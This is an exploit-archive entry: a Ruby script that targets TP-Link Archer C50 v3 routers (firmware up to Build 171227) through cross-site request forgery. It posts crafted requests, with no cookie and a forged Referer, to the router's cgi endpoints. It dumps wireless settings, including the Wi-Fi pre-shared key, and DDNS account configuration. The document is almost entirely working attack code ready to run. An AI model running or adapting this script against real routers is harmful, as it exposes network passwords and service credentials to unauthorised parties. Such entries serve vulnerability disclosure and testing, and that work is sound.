# Exploit Title: TP-Link C50 Wireless Router 3 - Cross-Site Request Forgery (Information Disclosure)
# Date: 2018-08-09
# Exploit Author: Wadeek
# Vendor Homepage: https://www.tp-link.com/
# Hardware Version: Archer C50 v3 00000001
# Firmware Link: https://www.tp-link.com/download/Archer-C50_V3.html#Firmware
# Firmware Version: <= Build 171227

#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
url = "http://192.168.0.1:80/"
#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

require('mechanize')
agent = Mechanize.new()

def dump(agent, url, path, query)
begin
	response = agent.post(url+path, query, {
		"User-Agent" => "",
		"Accept" => "*/*",
		"Referer" => "http://192.168.0.1/mainFrame.htm",
		"Content-Type" => "text/plain",
		"Connection" => "keep-alive",
		"Cookie" => ""
	})
rescue Exception => e
	begin
		puts(e.inspect())
		puts(e.page().body())
	rescue
	end
	puts("")
else
	puts(path)
	puts(response.body())
	puts("")
end
end

#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
# Get Wireless Settings
dump(agent, url, "cgi?5", "[LAN_WLAN#0,0,0,0,0,0#0,0,0,0,0,0]0,10\r\nname\r\nenable\r\nstandard\r\nSSID\r\nregulatoryDomain\r\npossibleChannels\r\nautoChannelEnable\r\nchannel\r\nX_TP_PreSharedKey\r\nX_TP_Band\r\n")

# Get DDNS Settings
dump(agent, url, "cgi?1&1&1", "[DYN_DNS_CFG#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n[NOIP_DNS_CFG#0,0,0,0,0,0#0,0,0,0,0,0]1,0\r\n[CMX_DNS_CFG#0,0,0,0,0,0#0,0,0,0,0,0]2,0\r\n")
#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!